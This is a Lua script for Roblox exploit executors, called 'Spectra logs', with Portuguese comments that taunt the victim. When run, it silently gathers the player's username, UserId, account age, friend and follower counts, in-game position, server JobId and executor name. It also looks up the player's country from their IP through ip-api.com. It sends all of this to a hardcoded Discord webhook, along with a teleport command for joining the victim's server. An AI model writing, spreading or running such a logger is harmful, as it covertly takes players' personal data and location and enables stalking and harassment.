--[[
    Spectra logs pega rpz hihih
    Eu sou fodaaaaaaaaaaaaaaaaa
    Seu lixoooooooooooooooooooo
    N presta pra nadaaaaaaaaaaa


--]]

local HttpService = game:GetService('HttpService')
local MarketplaceService = game:GetService('MarketplaceService')
local Players = game:GetService('Players')
local Stats = game:GetService("Stats")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- 1. Informa√ß√µes de Identidade
local userId = player.UserId
local displayName = player.DisplayName 
local username = player.Name       
local accountAge = player.AccountAge
local pos = rootPart.Position

-- 2. Informa√ß√µes de Social (Amigos e Seguidores)
local friendCount = "Erro"
local followerCount = "Erro"

pcall(function()
    -- Amigos
    friendCount = #Players:GetFriendsAsync(userId):GetCurrentPage()
    -- Seguidores (Usando API do pr√≥prio Roblox via Proxy ou similar)
    -- Nota: A maioria dos executores permite essa leitura direta
    local socialUrl = "https://friends.roblox.com/v1/users/" .. userId .. "/followers/count"
    local response = game:HttpGet(socialUrl)
    local data = HttpService:JSONDecode(response)
    followerCount = data.count or "0"
end)

-- 3. Informa√ß√µes do Servidor (Jogadores Atual/Max)
local currentPlayers = #Players:GetPlayers()
local maxPlayers = Players.MaxPlayers
local serverPopulation = currentPlayers .. "/" .. maxPlayers

-- 4. Localiza√ß√£o (Pa√≠s)
local country = "Desconhecido"
pcall(function()
    local response = game:HttpGet("http://ip-api.com/json/")
    local data = HttpService:JSONDecode(response)
    country = data.country or "Desconhecido"
end)

-- 5. Data e Hora Real
local timestamp = os.date("%d/%m/%Y - %X")

-- 6. L√≥gica de Servidor P√∫blico/Privado e Imagens
local isPrivate = game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0
local serverType = isPrivate and "Privado" or "P√∫blico"
local embedImage = isPrivate and "https://i.postimg.cc/Cxbg1wgS/kermit-(2).gif" or "https://i.postimg.cc/6QjtsYKn/jjk-jujutsu-kaisen.gif"

-- 7. Prepara√ß√£o do Webhook
local webhookData = {
    embeds = {
        [1] = {
            title = 'üî¥ Spectra execu√ß√£o',
            color = 16711680, -- Vermelho
            thumbnail = {
                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. userId .. '&width=150&height=150&format=png',
            },
            image = {
                url = embedImage
            },
            fields = {
                {name = 'üë§ Usu√°rio/Display', value = "**" .. username .. "** (üëë*" .. displayName .. "*)", inline = true},
                {name = 'üÜî UserId', value = tostring(userId), inline = true},
                {name = 'üåç Pa√≠s do player', value = "üìç" .. country, inline = true},
                
                {name = 'üìÖ Idade da Conta', value = accountAge .. " dias", inline = true},

                {name = 'üéÆ quandos players tem no servidor', value = serverPopulation, inline = true},
                {name = 'üîí Tipo de Servidor p√∫blico/privado', value = serverType, inline = true},
                {name = 'üíª Executor', value = identifyexecutor() or "Desconhecido", inline = true},
                
                {name = 'üìç Posi√ß√£o do jogador quando ele executou', value = string.format("X: %.0f, Y: %.0f, Z: %.0f", pos.X, pos.Y, pos.Z), inline = false},
                {name = 'üó∫Ô∏è Jogo/Place', value = MarketplaceService:GetProductInfo(game.PlaceId).Name .. " [" .. game.PlaceId .. "]", inline = false},
                
                {name = 'üïí Data/Hora', value = timestamp, inline = false},
                {name = 'üîë JobID (Server)', value = "```" .. game.JobId .. "```", inline = false},
                {
                    name = 'üåÄ Teleporte para o servidor do player', 
                    value = "\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)", 
                    inline = false
                },
            },
            footer = {
                text = "Spectra sistem logs ‚Ä¢ by assure_TV"
            }
        },
    },
}

-- 8. Envio do Webhook
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
if request then
    request({
        Url = 'https://discord.com/api/webhooks/1475528399110799532/M1Adg0kFXPyJJfA7m20XyelDMofp88P8ermgQDxMC_Yq1oD_1wOTixDPZeNpz4MagpcN',
        Method = 'POST',
        Headers = {['Content-Type'] = 'application/json'},
        Body = HttpService:JSONEncode(webhookData),
    })
    print('Log completo enviado com sucesso!')
else
    warn('Seu executor n√£o suporta requisi√ß√µes HTTP (Webhook).')
end
